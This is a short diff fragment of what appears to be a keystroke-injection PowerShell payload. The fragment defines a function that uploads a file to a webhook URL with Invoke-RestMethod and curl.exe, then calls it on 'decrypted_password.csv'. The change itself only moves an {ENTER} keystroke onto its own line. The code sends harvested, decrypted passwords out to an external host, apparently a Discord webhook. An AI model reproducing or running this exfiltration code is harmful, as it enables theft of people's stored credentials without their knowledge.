@@ -26,6 +26,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-Upload-Discord -file "decrypted_password.csv" {ENTER}
+Upload-Discord -file "decrypted_password.csv"
+{ENTER}
 
 
